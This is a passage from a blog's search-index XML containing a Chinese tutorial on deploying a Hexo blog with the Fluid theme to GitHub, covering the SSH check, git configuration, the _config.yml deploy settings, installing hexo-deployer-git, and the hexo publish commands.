class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ssh</span> -T git<span class="hljs-variable">@github</span>.com<br></code></pre></td></tr></table></figure><p><img src="/img/blogimg/image-20230620140228351.png"></p><p>然后再输入：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">git config <span class="hljs-attr">--global</span> user<span class="hljs-selector-class">.name</span> <span class="hljs-string">&quot;xxx&quot;</span><span class="hljs-comment">// 你的github用户名，非昵称</span><br>git config <span class="hljs-attr">--global</span> user<span class="hljs-selector-class">.email</span>  <span class="hljs-string">&quot;xxx@qq.com&quot;</span><span class="hljs-comment">// 填写你的github注册邮箱</span><br></code></pre></td></tr></table></figure><h1 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h1><p>修改当时创建的空文件夹内的<code>_config.yml</code>文件</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dts">在文件的末尾修改(repository属性的地址就是之前创建仓库后所保存的http地址)<br><span class="hljs-symbol">deploy:</span><br><span class="hljs-symbol">type:</span> git<br><span class="hljs-symbol">repository:</span> https:<span class="hljs-comment">//github.com/xxx</span><br><span class="hljs-symbol">branch:</span> master<br></code></pre></td></tr></table></figure><p>安装hexo-deployer-git插件</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">cnpm install hexo-deployer-git <span class="hljs-comment">--save</span><br></code></pre></td></tr></table></figure><p>新建一篇测试文章，文章默认生成在<code>\blog\source\_posts</code>下面</p><figure class="highlight plaintext"><figcaption><span>new “文章名称”</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs hexo">hexo new “文章名称”<br></code></pre></td></tr></table></figure><p>将文章同步到github上去</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">hexo clean</span><br><span class="hljs-attribute">hexo g</span><br><span class="hljs-attribute">hexo d</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>博客搭建</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Hexo</tag>
      
      <tag>Fluid</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
